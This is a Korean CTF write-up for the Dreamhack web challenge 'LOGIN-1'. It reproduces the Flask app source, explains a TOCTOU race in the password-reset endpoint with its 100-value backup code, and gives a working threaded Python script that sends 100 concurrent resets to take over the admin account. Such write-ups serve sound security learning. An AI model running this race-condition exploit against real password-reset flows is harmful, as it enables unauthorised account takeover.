---
title: "LOGIN-1  tier 2"
summary: "LOGIN-1 CTF writeup."
date: "2026-04-10"
category: "ctf"
section: "security"
badge: "CTF / Wargame"
badgeTone: "ctf"
tags:
  - ctf
  - web
statLabel: "tier"
statValue: "2"
heroEyebrow: "$ cat content/posts/login1-tier-2.md"
heroAvatar: "CTF"
---


## 문제 개요

- 챌린지 유형: Web, TOCTOU
- 목표: admin 계정 탈취하는 문제 

## 분석 과정
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import sqlite3
import hashlib
import os
import time, random

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = "database.db"

userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def makeBackupcode():
    return random.randrange(100)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";


@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"

app.run(host='0.0.0.0', port=8000)
```
- admin 계정을 로그인하여 /admin 엔드포인트에 진입하면 플래그 획득 가능
- /forgot_password 엔드포인트 확인 하면패스워드를 하나하나 추출해내야 함
![step1](/public/images/login1.png)
- backupCode가 옴
```python
def makeBackupcode():
    return random.randrange(100)
```
- 백업 코드에 경우 100개 밖에 되지 않기 때문에 burute force 가능성이 보임 
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```
- MAXRESETCOUNT 제한을 두어 brute force을 막으려 함
- 해당 코드는 조회와 수정이 분리되어 있음
→ 안전한 로직은 데이터 읽고 검증하고 수정하는 과정에서 끼어들 수 없게 하나의 덩어리(원자성)로 처리되어야 함

- `cur.execute(SELCE...` 를 통해 DB 있는 데이터를 user 변수에 저장함 
→ 실시간으로 DB를 보고있는 것이 아닌, 특정 시점(과거의 스냅샷)의 상태를 저장

- DB에서 데이터 읽어올 때, 데이터 검토, 수정 작업 끝날때 까지 행을 읽거나 건드리지 않게 하는 안전장치 잠금이 없음
→ 수백개의 다른 요청이 동시에 동일한 데이터 값을 아무런 제약 없이 복사해 갈 수 있음

- 조회(cur.execute(’SELE....)과 수정(if 문 이후 UPDAT…) 두 쿼리 사이에 아무런 연결고리가 존재하지 않기 때문에 끊어진 틈새에 다른 스레드의 SELECT, UPDATE 가 얼마든지 비집고 들어올 수 있는 구조
- time.sleep(1)이 존재하기 때문에 100개의 요청 동시에 보내는 것도 쉬워짐

```text
💡 TOCTOU(Time-Of-Check to Time-Of-Use) 취약점 
```

### 최종 페이로드
- admin 권한을 가진 user 계정 찾기
```python
@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";
```
![step1](/public/images/login1-2.png)
- Apple 계정의 UserLevel이 1(admin) 인것을 확인
- 해당 계정에 백업코드(0~99)설정해 100개의 요청을 동시에 보내는 페이로드 작성

```python
import requests
import threading

TARGET_URL = "http://host3.dreamhack.games:19336/forgot_password" # 타겟 URL로 변경
TARGET_USERID = "Apple" # 식별한 관리자 ID
NEW_PASSWORD = "123"

def send_reset_request(backup_code):
    data = {
        "userid": TARGET_USERID,
        "newpassword": NEW_PASSWORD,
        "backupCode": backup_code
    }
    try:
        # 응답을 기다리지 않고 일단 던지는 것이 중요합니다.
        requests.post(TARGET_URL, data=data)
        print(f"[*] 요청 전송 완료 - backupCode: {backup_code}")
    except Exception as e:
        pass

def exploit():
    threads = []
    print("[*] Race Condition 공격 시작...")
    
    # 0부터 99까지의 백업 코드를 가진 100개의 스레드 생성
    for code in range(100):
        t = threading.Thread(target=send_reset_request, args=(code,))
        threads.append(t)
        
    # 모든 스레드를 일제히 시작 (거의 동시에 100개의 요청이 날아감)
    for t in threads:
        t.start()
        
    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
        t.join()
        
    print("\n[+] 공격 완료! 타겟 계정으로 로그인을 시도해 보세요.")

if __name__ == "__main__":
    exploit() # 주석 해제 후 실행
    pass
```
- 해당 코드 실행 시 Apple 계정의 비밀번호가 123로 변경 
![step1](/public/images/login1-3.png)
- admin 엔드포인트 접근 가능 
